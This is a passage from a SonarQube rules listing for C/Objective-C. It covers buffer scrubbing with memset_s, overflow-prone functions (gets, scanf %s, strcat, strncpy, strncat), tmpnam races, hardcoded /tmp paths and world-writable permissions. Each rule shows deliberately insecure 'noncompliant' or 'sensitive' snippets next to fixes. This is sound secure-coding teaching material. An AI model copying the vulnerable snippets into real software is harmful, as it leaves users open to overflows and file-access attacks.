<p>The function <a href="https://en.cppreference.com/w/c/string/byte/memset" rel="nofollow"><code>memset_s</code></a> behaves similarly to <code>memset</code>, but
the main difference is that it cannot be optimized away, the memory will be overwritten in all cases. You should always use this function to scrub
security-sensitive data.</p>
<p>This rule raises an issue when a call to <code>memset</code> is followed by the destruction of the buffer.</p>
<p>Note that <code>memset_s</code> is defined in annex K of C11, so to have access to it, you need a standard library that supports it (this can be
tested with the macro <code>__STDC_LIB_EXT1__</code>), and you need to enable it by defining the macro <code>__STDC_WANT_LIB_EXT1__</code> before
including <code>&lt;string.h&gt;</code>. Other platform specific functions can perform the same operation, for instance <a href="https://docs.microsoft.com/en-us/previous-versions/windows/desktop/legacy/aa366877%28v&#61;vs.85%29?redirectedfrom&#61;MSDN" rel="nofollow">SecureZeroMemory</a> (Windows)
or <a href="https://www.freebsd.org/cgi/man.cgi?query&#61;explicit_bzero" rel="nofollow">explicit_bzero</a> (FreeBSD)</p>
<h3>Noncompliant code example</h3>
<pre>
void f(char *password, size_t bufferSize) {
  char localToken[256];
  init(localToken, password);
  memset(password, &#39; &#39;, strlen(password)); // Noncompliant, password is about to be freed
  memset(localToken, &#39; &#39;, strlen(localToken)); // Noncompliant, localToken is about to go out of scope
  free(password);
}
</pre>
<h3>Compliant solution</h3>
<pre>
void f(char *password, size_t bufferSize) {
  char localToken[256];
  init(localToken, password);
  memset_s(password, bufferSize, &#39; &#39;, strlen(password));
  memset_s(localToken, sizeof(localToken), &#39; &#39;, strlen(localToken));
  free(password);
}
</pre>
<h2>Resources</h2>
<ul><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://cwe.mitre.org/data/definitions/14" rel="nofollow">MITRE, CWE-14</a> - Compiler Removal of Code to Clear Buffers </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=objc:S1079">
              objc:S1079
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>The <code>%s</code> placeholder is used to read a word into a string.</p>
<p>By default, there is no restriction on the length of that word, and the developer is required to pass a sufficiently large buffer for storing
it.</p>
<p>No matter how large the buffer is, there will always be a longer word.</p>
<p>Therefore, programs relying on <code>%s</code> are vulnerable to buffer overflows.</p>
<p>A field width specifier can be used together with the <code>%s</code> placeholder to limit the number of bytes which will by written to the
buffer.</p>
<p>Note that an additional byte is required to store the null terminator.</p>
<h3>Noncompliant code example</h3>
<pre>
char buffer[10];
scanf(&#34;%s&#34;, buffer);      // Noncompliant - will overflow when a word longer than 9 characters is entered
</pre>
<h3>Compliant solution</h3>
<pre>
char buffer[10];
scanf(&#34;%9s&#34;, buffer);     // Compliant - will not overflow
</pre>
<h2>Resources</h2>
<ul><li> <a href="https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities" rel="nofollow">OWASP Top 10 2017 Category A9</a> -
  Using Components with Known Vulnerabilities </li><li> <a href="https://cwe.mitre.org/data/definitions/120" rel="nofollow">MITRE, CWE-120</a> - Buffer Copy without Checking Size of Input (&#39;Classic Buffer
  Overflow&#39;) </li><li> <a href="https://cwe.mitre.org/data/definitions/676" rel="nofollow">MITRE, CWE-676</a> - Use of Potentially Dangerous Function </li><li> <a href="https://www.sans.org/top25-software-errors/#cat2" rel="nofollow">SANS Top 25</a> - Risky Resource Management </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=objc:S5443">
              objc:S5443
            </a>
          </td>
          <td>
            <details>
              <p>Operating systems have global directories where any user has write access. Those folders are mostly used as temporary storage areas like
<code>/tmp</code> in Linux based systems. An application manipulating files from these folders is exposed to race conditions on filenames: a malicious
user can try to create a file with a predictable name before the application does. A successful attack can result in other files being accessed,
modified, corrupted or deleted. This risk is even higher if the application runs with elevated permissions.</p>
<p>In the past, it has led to the following vulnerabilities:</p>
<ul><li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2012-2451" rel="nofollow">CVE-2012-2451</a> </li><li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2015-1838" rel="nofollow">CVE-2015-1838</a> </li></ul>
<p>This rule raises an issue whenever it detects a hard-coded path to a publicly writable directory like <code>/tmp</code> (see examples bellow). It
also detects access to environment variables that point to publicly writable directories, e.g., <code>TMP</code> and <code>TMPDIR</code>.</p>
<ul><li> <code>/tmp</code> </li><li> <code>/var/tmp</code> </li><li> <code>/usr/tmp</code> </li><li> <code>/dev/shm</code> </li><li> <code>/dev/mqueue</code> </li><li> <code>/run/lock</code> </li><li> <code>/var/run/lock</code> </li><li> <code>/Library/Caches</code> </li><li> <code>/Users/Shared</code> </li><li> <code>/private/tmp</code> </li><li> <code>/private/var/tmp</code> </li><li> <code>\Windows\Temp</code> </li><li> <code>\Temp</code> </li><li> <code>\TMP</code> </li></ul>
<h2>Ask Yourself Whether</h2>
<ul><li> Files are read from or written into a publicly writable folder </li><li> The application creates files with predictable names into a publicly writable folder </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Use a dedicated sub-folder with tightly controlled permissions </li><li> Use secure-by-design APIs to create temporary files. Such API will make sure:
    <ul><li> The generated filename is unpredictable </li><li> The file is readable and writable only by the creating user ID </li><li> The file descriptor is not inherited by child processes </li><li> The file will be destroyed as soon as it is closed </li></ul>  </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
#include &lt;cstdio&gt;
// ...

void f() {
  FILE * fp &#61; fopen(&#34;/tmp/temporary_file&#34;, &#34;r&#34;); // Sensitive
}
</pre>
<pre>
#include &lt;cstdio&gt;
#include &lt;cstdlib&gt;
#include &lt;sstream&gt;
// ...

void f() {
  std::stringstream ss;
  ss &lt;&lt; getenv(&#34;TMPDIR&#34;) &lt;&lt; &#34;/temporary_file&#34;; // Sensitive
  FILE * fp &#61; fopen(ss.str().c_str(), &#34;w&#34;);
}
</pre>
<h2>Compliant Solution</h2>
<pre>
#include &lt;cstdio&gt;
#include &lt;cstdlib&gt;
// ...

void f() {
  FILE * fp &#61; tmpfile(); // Compliant
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control
  </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://cwe.mitre.org/data/definitions/377" rel="nofollow">MITRE, CWE-377</a> - Insecure Temporary File </li><li> <a href="https://cwe.mitre.org/data/definitions/379" rel="nofollow">MITRE, CWE-379</a> - Creation of Temporary File in Directory with Incorrect Permissions
  </li><li> <a href="https://owasp.org/www-community/vulnerabilities/Insecure_Temporary_File" rel="nofollow">OWASP, Insecure Temporary File</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=objc:S2612">
              objc:S2612
            </a>
          </td>
          <td>
            <details>
              <p>In Unix file system permissions, the &#34;<code>others</code>&#34; category refers to all users except the owner of the file system resource and the
members of the group assigned to this resource.</p>
<p>Granting permissions to this category can lead to unintended access to files or directories that could allow attackers to obtain sensitive
information, disrupt services or elevate privileges.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The application is designed to be run on a multi-user environment. </li><li> Corresponding files and directories may contain confidential information. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>The most restrictive possible permissions should be assigned to files and directories.</p>
<h2>Sensitive Code Example</h2>
<p>When creating a file or directory with permissions to &#34;other group&#34;:</p>
<pre>
open(&#34;myfile.txt&#34;, O_CREAT, S_IRWXU | S_IRWXG | S_IRWXO); // Sensitive: the process set 777 permissions to this newly created file

mkdir(&#34;myfolder&#34;, S_IRWXU | S_IRWXG | S_IRWXO); // Sensitive: the process try to set 777 permissions to this newly created directory
</pre>
<p>When explicitly adding permissions to &#34;other group&#34; with <code>chmod</code>, <code>fchmod</code> or <code>filesystem::permissions</code>
functions:</p>
<pre>
chmod(&#34;myfile.txt&#34;, S_IRWXU | S_IRWXG | S_IRWXO);  // Sensitive: the process set 777 permissions to this file

fchmod(fd, S_IRWXU | S_IRWXG | S_IRWXO); // Sensitive: the process set 777 permissions to this file descriptor
</pre>
<p>When defining the <code>umask</code> without read, write and execute permissions for &#34;other group&#34;:</p>
<pre>
umask(S_IRWXU | S_IRWXG); // Sensitive: the further files and folders will be created with possible permissions to &#34;other group&#34;
</pre>
<h2>Compliant Solution</h2>
<p>When creating a file or directory, do not set permissions to &#34;other group&#34;:</p>
<pre>
open(&#34;myfile.txt&#34;, O_CREAT, S_IRWXU | S_IRWXG); // Compliant

mkdir(&#34;myfolder&#34;, S_IRWXU | S_IRWXG); // Compliant
</pre>
<p>When using <code>chmod</code>, <code>fchmod</code> or <code>filesystem::permissions</code> functions, do not add permissions to &#34;other group&#34;:</p>
<pre>
chmod(&#34;myfile.txt&#34;, S_IRWXU | S_IRWXG);  // Compliant

fchmod(fd, S_IRWXU | S_IRWXG); // Compliant
</pre>
<p>When defining the <code>umask</code>, set read, write and execute permissions to other group:</p>
<pre>
umask(S_IRWXO); // Compliant: further created files or directories will not have permissions set for &#34;other group&#34;
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/" rel="nofollow">OWASP Top 10 2021 Category A4</a> - Insecure Design </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control
  </li><li> <a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission" rel="nofollow">OWASP File Permission</a> </li><li> <a href="https://cwe.mitre.org/data/definitions/732" rel="nofollow">MITRE, CWE-732</a> - Incorrect Permission Assignment for Critical Resource </li><li> <a href="https://cwe.mitre.org/data/definitions/266" rel="nofollow">MITRE, CWE-266</a> - Incorrect Privilege Assignment </li><li> <a href="https://wiki.sei.cmu.edu/confluence/display/java/FIO01-J.&#43;Create&#43;files&#43;with&#43;appropriate&#43;access&#43;permissions" rel="nofollow">CERT, FIO01-J.</a> -
  Create files with appropriate access permissions </li><li> <a href="https://wiki.sei.cmu.edu/confluence/display/c/FIO06-C.&#43;Create&#43;files&#43;with&#43;appropriate&#43;access&#43;permissions" rel="nofollow">CERT, FIO06-C.</a> - Create
  files with appropriate access permissions </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=objc:S1081">
              objc:S1081
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>When using typical C functions, it’s up to the developer to make sure the size of the buffer to be written to is large enough to avoid buffer
overflows. Buffer overflows can cause the program to crash at a minimum. At worst, a carefully crafted overflow can cause malicious code to be
executed.</p>
<p>This rule reports use of the following insecure functions, for which knowing the required size is not generally possible: <code>gets()</code> and
<code>getpw()</code>.</p>
<p>In such cases. The only way to prevent buffer overflow while using these functions would be to control the execution context of the
application.</p>
<p>It is much safer to secure the application from within and to use an alternate, secure function which allows you to define the maximum number of
characters to be written to the buffer:</p>
<ul><li> <code>fgets</code> or <code>gets_s</code> </li><li> <code>getpwuid</code> </li></ul>
<h3>Noncompliant code example</h3>
<pre>
gets(str); // Noncompliant; &#96;str&#96; buffer size is not checked and it is vulnerable to overflows
</pre>
<h3>Compliant solution</h3>
<pre>
gets_s(str, sizeof(str)); // Prevent overflows by enforcing a maximum size for &#96;str&#96; buffer
</pre>
<h2>Resources</h2>
<ul><li> <a href="https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities" rel="nofollow">OWASP Top 10 2017 Category A9</a> -
  Using Components with Known Vulnerabilities </li><li> <a href="https://cwe.mitre.org/data/definitions/676" rel="nofollow">MITRE, CWE-676</a> - Use of Potentially Dangerous Function </li><li> <a href="https://cwe.mitre.org/data/definitions/119" rel="nofollow">MITRE, CWE-119</a> - Improper Restriction of Operations within the Bounds of a Memory
  Buffer </li><li> <a href="https://www.sans.org/top25-software-errors/#cat2" rel="nofollow">SANS Top 25</a> - Risky Resource Management </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=objc:S5814">
              objc:S5814
            </a>
          </td>
          <td>
            <details>
              <p>In C, a string is just a buffer of characters, normally using the <code>null</code> character as a sentinel for the end of the string. This means
that the developer has to be aware of low-level details such as buffer sizes or having an extra character to store the final <code>null</code>
character. Doing that correctly and consistently is notoriously difficult and any error can lead to a security vulnerability, for instance, giving
access to sensitive data or allowing arbitrary code execution.</p>
<p>The function <code>char *strcat( char *restrict dest, const char *restrict src );</code> appends the characters of string <code>src</code> at the
end of <code>dest</code>. The <code>wcscat</code> does the same for wide characters and should be used with the same guidelines.</p>
<p>Note: the functions <code>strncat</code> and <code>wcsncat</code> might look like attractive safe replacements for <code>strcat</code> and
<code>wcscaty</code>, but they have their own set of issues (see <a href="/organizations/sopra-steria/rules?open&#61;objc%3AS5815&amp;rule_key&#61;objc%3AS5815" rel="nofollow">S5815</a>), and you should probably prefer another more adapted
alternative.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> There is a possibility that either the <code>src</code> or the <code>dest</code> pointer is <code>null</code> </li><li> The current string length of <code>dest</code> plus the current string length of <code>src</code> plus 1 (for the final <code>null</code>
  character) is larger than the size of the buffer pointer-to by <code>src</code> </li><li> There is a possibility that either string is not correctly <code>null</code>-terminated </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> C11 provides, in its annex K, the <code>strcat_s</code> and the <code>wcscat_s</code> that were designed as safer alternatives to
  <code>strcat</code> and <code>wcscat</code>. It’s not recommended to use them in all circumstances, because they introduce a runtime overhead and
  require to write more code for error handling, but they perform checks that will limit the consequences of calling the function with bad arguments.
  </li><li> Even if your compiler does not exactly support annex K, you probably have access to similar functions </li><li> If you are writing C&#43;&#43; code, using <code>std::string</code> to manipulate strings is much simpler and less error-prone </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
int f(char *src) {
  char dest[256];
  strcpy(dest, &#34;Result: &#34;);
  strcat(dest, src); // Sensitive: might overflow
  return doSomethingWith(dest);
}
</pre>
<h2>Compliant Solution</h2>
<pre>
int f(char *src) {
  char result[] &#61; &#34;Result: &#34;;
  char *dest &#61; malloc(sizeof(result) &#43; strlen(src)); // Not need of &#43;1 for final 0 because sizeof will already count one 0
  strcpy(dest, result);
  strcat(dest, src); // Compliant: the buffer size was carefully crafted
  int r &#61; doSomethingWith(dest);
  free(dest);
  return r;
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/" rel="nofollow">OWASP Top 10 2021 Category A6</a> - Vulnerable and Outdated
  Components </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities" rel="nofollow">OWASP Top 10 2017 Category A9</a> -
  Using Components with Known Vulnerabilities </li><li> <a href="https://cwe.mitre.org/data/definitions/120" rel="nofollow">MITRE, CWE-120</a> - Buffer Copy without Checking Size of Input (&#39;Classic Buffer
  Overflow&#39;) </li><li> <a href="https://wiki.sei.cmu.edu/confluence/x/HdcxBQ" rel="nofollow">CERT, STR07-C.</a> - Use the bounds-checking interfaces for string manipulation </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=objc:S5813">
              objc:S5813
            </a>
          </td>
          <td>
            <details>
              <p>The function <code>size_t strlen(const char *s)</code> measures the length of the string <code>s</code> (excluding the final null character).<br />
The function <code>size_t wcslen(const wchar_t *s)</code> does the same for wide characters, and should be used with the same guidelines.</p>
<p>Similarly to many other functions in the standard C libraries, <code>strlen</code> and <code>wcslen</code> assume that their argument is not a null
pointer.</p>
<p>Additionally, they expect the strings to be null-terminated. For example, the 5-letter string &#34;abcde&#34; must be stored in memory as &#34;abcde\0&#34; (i.e.
using 6 characters) to be processed correctly. When a string is missing the null character at the end, these functions will iterate past the end of
the buffer, which is undefined behavior.</p>
<p>Therefore, string parameters must end with a proper null character. The absence of this particular character can lead to security vulnerabilities
that allow, for example, access to sensitive data or the execution of arbitrary code.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> There is a possibility that the pointer is null. </li><li> There is a possibility that the string is not correctly null-terminated. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Use safer functions. The C11 functions <code>strlen_s</code> and <code>wcslen_s</code> from annex K handle typical programming errors.<br />
  Note, however, that they have a runtime overhead and require more code for error handling and therefore are not suited to every case. </li><li> Even if your compiler does not exactly support annex K, you probably have access to similar functions. </li><li> If you are writing C&#43;&#43; code, using <code>std::string</code> to manipulate strings is much simpler and less error-prone. </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
size_t f(char *src) {
  char dest[256];
  strncpy(dest, src, sizeof dest); // Truncation may happen
  return strlen(dest); // Sensitive: &#34;dest&#34; will not be null-terminated if truncation happened
}
</pre>
<h2>Compliant Solution</h2>
<pre>
size_t f(char *src) {
  char dest[256];
  strncpy(dest, src, sizeof dest); // Truncation may happen
  dest[sizeof dest - 1] &#61; 0;
  return strlen(dest); // Compliant: &#34;dest&#34; is guaranteed to be null-terminated
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://cwe.mitre.org/data/definitions/120" rel="nofollow">MITRE, CWE-120</a> - Buffer Copy without Checking Size of Input (&#39;Classic Buffer
  Overflow&#39;) </li><li> <a href="https://wiki.sei.cmu.edu/confluence/x/HdcxBQ" rel="nofollow">CERT, STR07-C.</a> - Use the bounds-checking interfaces for string manipulation </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=objc:S5816">
              objc:S5816
            </a>
          </td>
          <td>
            <details>
              <p>In C, a string is just a buffer of characters, normally using the <code>null</code> character as a sentinel for the end of the string. This means
that the developer has to be aware of low-level details such as buffer sizes or having an extra character to store the final <code>null</code>
character. Doing that correctly and consistently is notoriously difficult and any error can lead to a security vulnerability, for instance, giving
access to sensitive data or allowing arbitrary code execution.</p>
<p>The function <code>char *strncpy(char * restrict dest, const char * restrict src, size_t count);</code> copies the first <code>count</code>
characters from <code>src</code> to <code>dest</code>, stopping at the first <code>null</code> character, and filling extra space with 0. The
<code>wcsncpy</code> does the same for wide characters and should be used with the same guidelines.</p>
<p>Both of those functions are designed to work with fixed-length strings and might result in a non-<code>null</code>-terminated string.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> There is a possibility that either the <code>source</code> or the <code>destination</code> pointer is <code>null</code> </li><li> The security of your system can be compromised if the <code>destination</code> is a truncated version of the <code>source</code> </li><li> The <code>source</code> buffer can be both non-<code>null</code>-terminated and smaller than the <code>count</code> </li><li> The <code>destination</code> buffer can be smaller than the <code>count</code> </li><li> You expect <code>dest</code> to be a <code>null</code>-terminated string </li><li> There is an overlap between the <code>source</code> and the <code>destination</code> </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> C11 provides, in its annex K, the <code>strncpy_s</code> and the <code>wcsncpy_s</code> that were designed as safer alternatives to
  <code>strcpy</code> and <code>wcscpy</code>. It’s not recommended to use them in all circumstances, because they introduce a runtime overhead and
  require to write more code for error handling, but they perform checks that will limit the consequences of calling the function with bad arguments.
  </li><li> Even if your compiler does not exactly support annex K, you probably have access to similar functions </li><li> If you are using <code>strncpy</code> and <code>wsncpy</code> as a safer version of <code>strcpy</code> and <code>wcscpy</code>, you should
  instead consider <code>strcpy_s</code> and <code>wcscpy_s</code>, because these functions have several shortcomings:
    <ul><li> It’s not easy to detect truncation </li><li> Too much work is done to fill the buffer with 0, leading to suboptimal performance </li><li> Unless manually corrected, the <code>dest</code> string might not be <code>null</code>-terminated </li></ul>  </li><li> If you want to use <code>strcpy</code> and <code>wcscpy</code> functions and detect if the string was truncated, the pattern is the following:
    <ul><li> Set the last character of the buffer to <code>null</code> </li><li> Call the function </li><li> Check if the last character of the buffer is still <code>null</code> </li></ul>  </li><li> If you are writing C&#43;&#43; code, using <code>std::string</code> to manipulate strings is much simpler and less error-prone </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
int f(char *src) {
  char dest[256];
  strncpy(dest, src, sizeof(dest)); // Sensitive: might silently truncate
  return doSomethingWith(dest);
}
</pre>
<h2>Compliant Solution</h2>
<pre>
int f(char *src) {
  char dest[256];
  dest[sizeof dest - 1] &#61; 0;
  strncpy(dest, src, sizeof(dest)); // Compliant
  if (dest[sizeof dest - 1] !&#61; 0) {
    // Handle error
  }
  return doSomethingWith(dest);
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/" rel="nofollow">OWASP Top 10 2021 Category A6</a> - Vulnerable and Outdated
  Components </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities" rel="nofollow">OWASP Top 10 2017 Category A9</a> -
  Using Components with Known Vulnerabilities </li><li> <a href="https://cwe.mitre.org/data/definitions/120" rel="nofollow">MITRE, CWE-120</a> - Buffer Copy without Checking Size of Input (&#39;Classic Buffer
  Overflow&#39;) </li><li> <a href="https://wiki.sei.cmu.edu/confluence/x/HdcxBQ" rel="nofollow">CERT, STR07-C.</a> - Use the bounds-checking interfaces for string manipulation </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=objc:S5815">
              objc:S5815
            </a>
          </td>
          <td>
            <details>
              <p>In C, a string is just a buffer of characters, normally using the <code>null</code> character as a sentinel for the end of the string. This means
that the developer has to be aware of low-level details such as buffer sizes or having an extra character to store the final <code>null</code>
character. Doing that correctly and consistently is notoriously difficult and any error can lead to a security vulnerability, for instance, giving
access to sensitive data or allowing arbitrary code execution.</p>
<p>The function <code>char *strncat( char *restrict dest, const char *restrict src, size_t count );</code> appends the characters of string
<code>src</code> at the end of <code>dest</code>, but only add <code>count</code> characters max. <code>dest</code> will always be
<code>null</code>-terminated. The <code>wcsncat</code> does the same for wide characters, and should be used with the same guidelines.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> There is a possibility that either the <code>src</code> or the <code>dest</code> pointer is <code>null</code> </li><li> The current string length of <code>dest</code> plus the current string length of <code>src</code> plus 1 (for the final <code>null</code>
  character) is larger than the size of the buffer pointer-to by <code>src</code> </li><li> There is a possibility that either string is not correctly <code>null</code>-terminated </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> C11 provides, in its annex K, the <code>strncat_s</code> and the <code>wcsncat_s</code> that were designed as safer alternatives to
  <code>strncat</code> and <code>wcsncat</code>. It’s not recommended to use them in all circumstances because they introduce a runtime overhead and
  require to write more code for error handling, but they perform checks that will limit the consequences of calling the function with bad arguments.
  </li><li> Even if your compiler does not exactly support annex K, you probably have access to similar functions </li><li> If you are using <code>strncat</code> and <code>wsncat</code> as a safer version of <code>strcat</code> and <code>wcscat</code>, you should
  instead consider <code>strcat_s</code> and <code>wcscat_s</code> because these functions have several shortcomings:
    <ul><li> It’s not easy to detect truncation </li><li> The <code>count</code> parameter is error-prone </li><li> Computing the <code>count</code> parameter typically requires computing the string length of <code>dest</code>, at which point other
      simpler alternatives exist </li></ul>  </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
int f(char *src) {
  char dest[256];
  strcpy(dest, &#34;Result: &#34;);
  strncat(dest, src, sizeof dest); // Sensitive: passing the buffer size instead of the remaining size
  return doSomethingWith(dest);
}
</pre>
<h2>Compliant Solution</h2>
<pre>
int f(char *src) {
  char result[] &#61; &#34;Result: &#34;;
  char dest[256];
  strcpy(dest, result);
  strncat(dest, src, sizeof dest - sizeof result); // Compliant but may silently truncate
  return doSomethingWith(dest);
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/" rel="nofollow">OWASP Top 10 2021 Category A6</a> - Vulnerable and Outdated
  Components </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities" rel="nofollow">OWASP Top 10 2017 Category A9</a> -
  Using Components with Known Vulnerabilities </li><li> <a href="https://cwe.mitre.org/data/definitions/120" rel="nofollow">MITRE, CWE-120</a> - Buffer Copy without Checking Size of Input (&#39;Classic Buffer
  Overflow&#39;) </li><li> <a href="https://wiki.sei.cmu.edu/confluence/x/HdcxBQ" rel="nofollow">CERT, STR07-C.</a> - Use the bounds-checking interfaces for string manipulation </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=objc:S5824">
              objc:S5824
            </a>
          </td>
          <td>
            <details>
              <p>The functions &#34;tmpnam&#34;, &#34;tmpnam_s&#34; and &#34;tmpnam_r&#34; are all used to return a file name that does not match an existing file, in order for the
application to create a temporary file. However, even if the file did not exist at the time those functions were called, it might exist by the time
the application tries to use the file name to create the files. This has been used by hackers to gain access to files that the application believed
were trustworthy.</p>
<p>There are alternative functions that, in addition to creating a suitable file name, create and open the file and return the file handler. Such
functions are protected from this attack vector and should be preferred. About the only reason to use these functions would be to create a temporary
folder, not a temporary file.</p>
<p>Additionally, these functions might not be thread-safe, and if you don’t provide them buffers of sufficient size, you will have a buffer
overflow.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> There is a possibility that several threads call any of these functions simultaneously </li><li> There is a possibility that the resulting file is opened without forcing its creation, meaning that it might have unexpected access rights
  </li><li> The buffers passed to these functions are respectively smaller than
    <ul><li> <code>L_tmpnam</code> for <code>tmpnam</code> </li><li> <code>L_tmpnam_s</code> for <code>tmpnam_s</code> </li><li> <code>L_tmpnam</code> for <code>tmpnam_r</code> </li></ul>  </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Use a function that directly opens the temporary file, such a <code>tmpfile</code>, <code>tmpfile_s</code>, <code>mkstemp</code> or
  <code>mkstemps</code> (the last two allow more accurate control of the file name). </li><li> If you can’t get rid of these functions, when using the generated name to open the file, use a function that forces the creation of the file
  and fails if the file already exists. </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
int f(char *tempData) {
  char *path &#61; tmpnam(NULL); // Sensitive
  FILE* f &#61; fopen(tmpnam, &#34;w&#34;);
  fputs(tempData, f);
  fclose(f);
}
</pre>
<h2>Compliant Solution</h2>
<pre>
int f(char *tempData) {
  // The file will be opened in &#34;wb&#43;&#34; mode, and will be automatically removed on normal program exit
  FILE* f &#61; tmpfile(); // Compliant
  fputs(tempData, f);
  fclose(f);
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/" rel="nofollow">OWASP Top 10 2021 Category A6</a> - Vulnerable and Outdated
  Components </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities" rel="nofollow">OWASP Top 10 2017 Category A9</a> -
  Using Components with Known Vulnerabilities </li><li> <a href="https://cwe.mitre.org/data/definitions/377" rel="nofollow">MITRE, CWE-377</a> - Insecure Temporary File </li><li> <a href="https://wiki.sei.cmu.edu/confluence/display/c/CON33-C.&#43;Avoid&#43;race&#43;conditions&#43;when&#43;using&#43;library&#43;functions" rel="nofollow">CERT, CON33-C.</a> - Avoid
  race conditions when using library functions </li><li> <a href="https://wiki.sei.cmu.edu/confluence/display/c/FIO21-C.&#43;Do&#43;not&#43;create&#43;temporary&#43;files&#43;in&#43;shared&#43;directories" rel="nofollow">CERT, FIO21-C.</a> - Do
  not create temporary files in shared directories </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=objc:S1313">
              objc:S1313
            </a>
          </td>
          <td>
            <details>
              <p>Hardcoding IP addresses is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2006-5901" rel="nofollow">CVE-2006-5901</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2005-3725" rel="nofollow">CVE-2005-3725</a> </li></ul>
<p>Today’s services have an ever-changing architecture due to their scaling and redundancy needs. It is a mistake to think that a service will always
have the same IP address. When it does change, the hardcoded IP will have to be modified too. This will have an impact on the product development,
delivery, and deployment:</p>
